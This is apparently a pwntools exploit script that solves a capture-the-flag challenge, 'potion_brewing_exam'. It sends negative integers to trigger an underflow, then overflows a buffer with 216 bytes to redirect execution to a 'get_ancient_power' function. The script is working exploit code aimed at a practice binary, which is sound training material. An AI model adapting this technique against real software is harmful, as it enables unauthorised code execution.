#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('../src/potion_brewing_exam')

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'localhost'
        PORT = 13371  
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

MAX_INT = 2147483647

UNDERFLOW = -(MAX_INT-200)

io.recvuntil(b'ingredient')

io.sendline(b'a')
io.sendline(str(UNDERFLOW).encode())

io.sendline(b'b')
io.sendline(str(UNDERFLOW).encode())

io.sendline(b'c')
io.sendline(b'0')

io.sendline(b'd')
io.sendline(b'0')

spell = flat(
    'A'*216,
    elf.sym['get_ancient_power']
)

io.recvuntil(b'spell!')
io.sendline(spell)

io.interactive()

